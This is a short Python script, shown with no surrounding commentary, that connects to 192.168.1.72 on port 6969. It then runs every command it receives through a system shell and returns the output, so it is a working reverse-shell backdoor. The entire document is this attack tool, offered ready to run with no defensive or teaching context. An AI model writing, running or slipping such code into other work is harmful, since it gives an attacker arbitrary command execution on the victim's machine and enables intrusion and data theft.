
import socket           
import subprocess               

def connect():
    cat = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    cat.connect(("192.168.1.72", 6969))                     
 
    while True:                                                

        command =  cat.recv(1024)                    
        shell =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        cat.send(shell.stdout.read()) 
        cat.send(shell.stderr.read()) 

def main ():
    connect()
main()
